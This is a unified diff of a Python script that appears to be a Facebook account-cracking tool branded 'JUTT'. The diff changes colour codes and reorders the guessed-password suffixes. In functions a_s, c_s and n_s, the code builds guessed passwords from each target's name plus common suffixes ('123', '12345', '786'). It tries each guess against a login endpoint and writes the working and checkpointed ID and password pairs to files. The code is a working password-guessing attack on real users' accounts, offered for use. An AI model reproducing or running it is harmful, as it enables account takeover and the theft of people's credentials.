@@ -502,17 +502,17 @@ def a_s():
         user = arg
         uid, name = user.split('|')
         try:
-            pass1 = name.lower() + '12345'
+            pass1 = name.lower() + '123'
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass1 + '\033[0;97m'
                 ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass1
+                print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass1
                 cp = open('JUTT_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -522,45 +522,45 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass2 + '\033[0;97m'
                     ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass2
+                    print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass2
                     cp = open('JUTT_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
                 else:
-                    pass3 = name.lower() + '786'
+                    pass3 = name.lower() + '12345'
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass3 + '\033[0;97m'
                         ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass3
+                        print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass3
                         cp = open('JUTT_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
                     else:
-                        pass4 = name.lower() + '123'
+                        pass4 = name.lower() + '786'
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass4 + '\033[0;97m'
                             ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass4
+                            print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass4
                             cp = open('JUTT_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -570,13 +570,13 @@ def a_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass5 + '\033[0;97m'
                                 ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass5
+                                print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass5
                                 cp = open('JUTT_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -586,13 +586,13 @@ def a_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass6 + '\033[0;97m'
                                     ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass6
+                                    print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass6
                                     cp = open('JUTT_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -602,13 +602,13 @@ def a_s():
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
-                                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass7 + '\033[0;97m'
                                         ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                         ok.write(uid + ' | ' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass7
+                                        print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass7
                                         cp = open('JUTT_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
@@ -618,13 +618,13 @@ def a_s():
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
                                         if 'loc' in q:
-                                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass8 + '\033[0;97m'
                                             ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                             ok.write(uid + ' | ' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass8
+                                            print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass8
                                             cp = open('JUTT_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
@@ -634,13 +634,13 @@ def a_s():
                                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                             q = json.loads(data)
                                             if 'loc' in q:
-                                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
+                                                print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass9 + '\033[0;97m'
                                                 ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                                 ok.write(uid + ' | ' + pass9 + '\n')
                                                 ok.close()
                                                 oks.append(uid + pass9)
                                             elif 'www.facebook.com' in q['error']:
-                                                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass9
+                                                print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass9
                                                 cp = open('JUTT_CP.txt', 'a')
                                                 cp.write(uid + ' | ' + pass9 + '\n')
                                                 cp.close()
@@ -650,13 +650,13 @@ def a_s():
                                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                 q = json.loads(data)
                                                 if 'loc' in q:
-                                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
+                                                    print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass10 + '\033[0;97m'
                                                     ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                                     ok.write(uid + ' | ' + pass10 + '\n')
                                                     ok.close()
                                                     oks.append(uid + pass10)
                                                 elif 'www.facebook.com' in q['error']:
-                                                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass10
+                                                    print '\033[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass10
                                                     cp = open('JUTT_CP.txt', 'a')
                                                     cp.write(uid + ' | ' + pass10 + '\n')
                                                     cp.close()
@@ -835,13 +835,13 @@ def c_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass1 + '\033[0;97m'
                 ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass1
+                print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass1
                 cp = open('JUTT_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -850,13 +850,13 @@ def c_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass2 + '\033[0;97m'
                     ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass2
+                    print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass2
                     cp = open('JUTT_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -865,13 +865,13 @@ def c_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass3 + '\033[0;97m'
                         ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass3
+                        print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass3
                         cp = open('JUTT_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -880,13 +880,13 @@ def c_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass4 + '\033[0;97m'
                             ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass4
+                            print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass4
                             cp = open('JUTT_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -895,13 +895,13 @@ def c_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass5 + '\033[0;97m'
                                 ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass5
+                                print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass5
                                 cp = open('JUTT_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -910,13 +910,13 @@ def c_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass6 + '\033[0;97m'
                                     ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass6
+                                    print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass6
                                     cp = open('JUTT_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -1101,13 +1101,13 @@ def n_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass1 + '\033[0;97m'
                 ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass1
+                print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass1
                 cp = open('JUTT_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -1117,13 +1117,13 @@ def n_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass2 + '\033[0;97m'
                     ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass2
+                    print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass2
                     cp = open('JUTT_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -1133,13 +1133,13 @@ def n_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass3 + '\033[0;97m'
                         ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass3
+                        print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass3
                         cp = open('JUTT_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -1149,13 +1149,13 @@ def n_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass4 + '\033[0;97m'
                             ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass4
+                            print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass4
                             cp = open('JUTT_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -1164,13 +1164,13 @@ def n_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass5 + '\033[0;97m'
                                 ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass5
+                                print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass5
                                 cp = open('JUTT_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -1179,13 +1179,13 @@ def n_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass6 + '\033[0;97m'
                                     ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass6
+                                    print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass6
                                     cp = open('JUTT_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -1194,13 +1194,13 @@ def n_s():
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
-                                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass7 + '\033[0;97m'
                                         ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                         ok.write(uid + ' | ' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass7
+                                        print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass7
                                         cp = open('JUTT_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
@@ -1209,13 +1209,13 @@ def n_s():
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
                                         if 'loc' in q:
-                                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print '\033[1;92m[JUTT-OK] \033[1;32m' + uid + ' | ' + pass8 + '\033[0;97m'
                                             ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                             ok.write(uid + ' | ' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass8
+                                            print '\033[1;37m[JUTT-CP] ' + uid + ' | ' + pass8
                                             cp = open('JUTT_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
